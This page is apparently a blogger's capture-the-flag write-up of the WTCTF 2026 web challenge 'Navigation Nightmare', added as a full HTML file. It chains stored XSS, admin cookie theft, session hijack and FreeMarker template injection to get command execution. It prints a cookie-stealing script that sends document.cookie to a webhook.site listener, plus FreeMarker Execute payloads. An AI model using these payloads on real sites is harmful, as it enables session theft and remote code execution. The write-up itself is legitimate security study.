@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>oka // WTCTF26 — Navigation Nightmare</title>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;1,300&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg:          #0D0D0B;
+      --bg2:         #131310;
+      --border:      #252520;
+      --amber:       #C87A10;
+      --amber-bright:#E8920A;
+      --amber-dim:   #6A4008;
+      --amber-glow:  rgba(200,122,16,0.07);
+      --green-bright:#6AAA3A;
+      --red:         #C03020;
+      --text:        #C8C0A8;
+      --text-dim:    #7A7468;
+      --text-bright: #F0E8D0;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'JetBrains Mono', monospace;
+      font-weight: 300;
+      font-size: 0.84rem;
+      line-height: 1.8;
+      min-height: 100vh;
+    }
+
+    body::after {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 3px,
+        rgba(0,0,0,0.04) 3px, rgba(0,0,0,0.04) 4px
+      );
+      pointer-events: none;
+      z-index: 999;
+    }
+
+    .container {
+      max-width: 720px;
+      margin: 0 auto;
+      padding: 56px 28px 120px;
+    }
+
+    .topbar {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 48px;
+      padding-bottom: 14px;
+      border-bottom: 1px solid var(--border);
+      font-size: 0.7rem;
+      color: var(--text-dim);
+    }
+    .topbar-dot {
+      width: 7px; height: 7px;
+      border-radius: 50%;
+      background: var(--amber-bright);
+      box-shadow: 0 0 8px var(--amber-bright);
+      flex-shrink: 0;
+      animation: pulse 3s ease-in-out infinite;
+    }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.2} }
+    .topbar-user { color: var(--green-bright); }
+    .topbar-path { color: var(--amber); }
+
+    .prompt-line {
+      font-size: 0.7rem;
+      color: var(--text-dim);
+      margin-bottom: 8px;
+    }
+    .prompt-line .p-user { color: var(--green-bright); }
+    .prompt-line .p-path { color: var(--amber); }
+    .prompt-line .p-cmd  { color: var(--text-bright); }
+
+    h1 {
+      font-size: 1.4rem;
+      font-weight: 500;
+      color: var(--text-bright);
+      letter-spacing: -0.01em;
+      line-height: 1.25;
+      margin-bottom: 20px;
+    }
+
+    .meta {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-bottom: 40px;
+      padding-bottom: 24px;
+      border-bottom: 1px solid var(--border);
+    }
+    .badge {
+      font-size: 0.65rem;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      padding: 3px 10px;
+      border: 1px solid var(--border);
+      color: var(--text-dim);
+    }
+    .badge.amber { border-color: var(--amber-dim); color: var(--amber); background: var(--amber-glow); }
+    .badge.green { border-color: #3A6018; color: var(--green-bright); background: rgba(106,170,58,0.07); }
+    .badge.red   { border-color: #6A1010; color: #E05040; background: rgba(192,48,32,0.07); }
+
+    .section { margin-bottom: 40px; }
+
+    .sec-head {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 18px;
+    }
+    .sec-head h2 {
+      font-size: 0.85rem;
+      font-weight: 400;
+      letter-spacing: 0.14em;
+      text-transform: uppercase;
+      color: var(--amber);
+      white-space: nowrap;
+    }
+    .sec-head::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+    }
+
+    p {
+      color: var(--text);
+      font-size: 0.84rem;
+      margin-bottom: 14px;
+      max-width: 640px;
+    }
+
+    pre {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-left: 2px solid var(--amber-dim);
+      padding: 16px 18px;
+      margin: 16px 0;
+      overflow-x: auto;
+      font-size: 0.78rem;
+      color: var(--text-bright);
+      line-height: 1.65;
+    }
+
+    code {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      padding: 1px 6px;
+      font-size: 0.8rem;
+      color: var(--amber);
+    }
+
+    .chain {
+      display: flex;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 6px;
+      margin-bottom: 32px;
+      padding: 14px 18px;
+      background: var(--bg2);
+      border: 1px solid var(--border);
+    }
+    .chain-step {
+      font-size: 0.68rem;
+      letter-spacing: 0.06em;
+      color: var(--text-bright);
+      padding: 3px 10px;
+      border: 1px solid var(--border);
+    }
+    .chain-arrow {
+      color: var(--amber-dim);
+      font-size: 0.7rem;
+    }
+
+    .footer {
+      margin-top: 64px;
+      padding-top: 16px;
+      border-top: 1px solid var(--border);
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.65rem;
+      color: var(--text-dim);
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+    .footer-ok { color: var(--green-bright); }
+    .footer-ok::before { content: '[OK] '; }
+    .footer a {
+      color: var(--text-dim);
+      text-decoration: none;
+      border-bottom: 1px solid var(--border);
+      transition: color 0.15s;
+    }
+    .footer a:hover { color: var(--amber-bright); }
+
+    @media (max-width: 560px) {
+      .meta { gap: 6px; }
+      pre { font-size: 0.72rem; padding: 12px; }
+      .chain { gap: 4px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+
+  <div class="topbar">
+    <div class="topbar-dot"></div>
+    <span class="topbar-user">okazavr</span>
+    <span style="color:var(--text-dim)">:</span>
+    <span class="topbar-path">oka-base</span>
+  </div>
+
+  <div class="prompt-line">
+    <span class="p-user">oka@machine</span>:<span class="p-path">~/oka-base/writeups/WTCTF26</span>$ <span class="p-cmd">cat Navigation_Nightmare.md</span>
+  </div>
+  <h1>WTCTF 2026 — Navigation Nightmare</h1>
+
+  <div class="meta">
+    <span class="badge amber">category: web</span>
+    <span class="badge">WTCTF 2026</span>
+    <span class="badge">21-02-2026</span>
+  </div>
+
+  <div class="section">
+    <div class="sec-head"><h2>tl;dr</h2></div>
+    <div class="chain">
+      <span class="chain-step">Stored XSS</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-step">Cookie Theft</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-step">Session Hijack</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-step">SSTI</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-step">RCE</span>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="sec-head"><h2>description</h2></div>
+    <p>The flight computer aboard our spaceship has malfunctioned and needs reprogramming with navigation data from the Galactic Atlas — a collaborative wiki documenting places across the galaxy. A hostile admin has taken over and vandalised the site, so we'll need to wrestle back control to recover the backup stored on the web server.</p>
+  </div>
+
+  <div class="section">
+    <div class="sec-head"><h2>recon</h2></div>
+    <p>Upon entering the website, we're greeted with a login page. We register an account with the credentials <code>oka:oka</code> and proceed to the index page:</p>
+    <img src="images/indexpage.png" style="width:100%; border: 1px solid var(--border); margin: 16px 0;">
+    <p>Presence of a <code>Template Editor</code> button on the sidebar hints at a potential Server-Side Template Injection (SSTI). Clicking it opens:</p>
+    <div style="text-align:center;">
+      <img src="images/template_editor.png" style="width:50%; border: 1px solid var(--border); margin: 16px 0;">
+    </div>
+    <p>We learn that the template used by the website is <code>FreeMarker</code> and that before we can exploit SSTI, we need to escalate privileges to admin, as the message suggests.</p>
+    <p>Browsing the articles, we notice each page has a <code>Report</code> button, suggesting an admin bot visits reported pages. Inspecting the source code, <code>ReportService.kt</code> confirms that a headless browser bot is logging in with admin credentials and visiting the reported article:</p>
+    <pre>driver.get("$baseUrl/login")
+driver.findElement(By.name("username")).sendKeys(adminCredentials.first)
+driver.findElement(By.name("password")).sendKeys(adminCredentials.second)
+driver.findElement(By.cssSelector("button[type='submit']")).click()
+Thread.sleep(2000)
+driver.get("$baseUrl/articles/$articleName")
+// View the page for a bit
+Thread.sleep(5000)</pre>
+    <p>This is an angle for cookie theft, but first we need to find where we can store our XSS payload.</p>
+  </div>
+
+  <div class="section">
+    <div class="sec-head"><h2>Stored XSS → Session Hijack</h2></div>
+    <p>Creating a new article and testing both the title and content fields with a simple <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, we find out that both are injectable.</p>
+    <img src="images/storedxss.png" style="width:100%; border: 1px solid var(--border); margin: 16px 0;">
+    <p>We also note that the session cookie lacks the <code>HttpOnly</code> flag, meaning it's accessible via JavaScript, making it possible to steal it.</p>
+    <p>XSS Payload</p>
+    <pre>&lt;script&gt;fetch("https://webhook.site/xxxxxx-xxxx-xxxx-xxxx-xxxxxxxxx?"+document.cookie)&lt;/script&gt;</pre>
+    <p>I used webhook listener to get the request with the cookie.</p>
+    <p>After submitting a report on the article with the payload, we receive the admin's request on our listener.</p>
+    <img src="images/webhook.png" style="width:100%; border: 1px solid var(--border); margin: 16px 0;">
+    <p>Admin's cookie is <code>ba29782bb23eebedabfb0ef56e25fa0e</code></p>
+    <div style="text-align:center;">
+      <img src="images/adminlogin.png" style="width:30%; border: 1px solid var(--border); margin: 16px 0;">
+    </div>
+  </div>  
+  <div class="section">
+    <div class="sec-head"><h2>SSTI → RCE</h2></div>
+    <p>In the template editor mentioned earlier, we edit the main template to contain the following FreeMarker payload, allowing us to execute arbitrary commands.</p>
+    <pre>${"freemarker.template.utility.Execute"?new()("ls")}</pre>
+    <p>After saving and reloading any article using the main template we see that the command <code>ls</code> was successfully executed:</p>
+    <div style="text-align:center;">
+      <img src="images/ls.png" style="width:50%; border: 1px solid var(--border); margin: 16px 0;">
+    </div>
+    <p>change the payload to get the flag</p>
+    <pre>${"freemarker.template.utility.Execute"?new()("cat flag.txt")}</pre>
+  </div>
+
+  <div class="section">
+    <div class="sec-head"><h2>flag</h2></div>
+    <div style="text-align:center;">
+      <img src="images/flag.png" style="width:40%; border: 1px solid var(--border); margin: 16px 0;">
+    </div>
+  </div>
+
+  <div class="footer">
+    <span class="footer-ok">all systems operational</span>
+    <a href="../index.html">← back</a>
+  </div>
+
+</div>
+</body>
+</html>
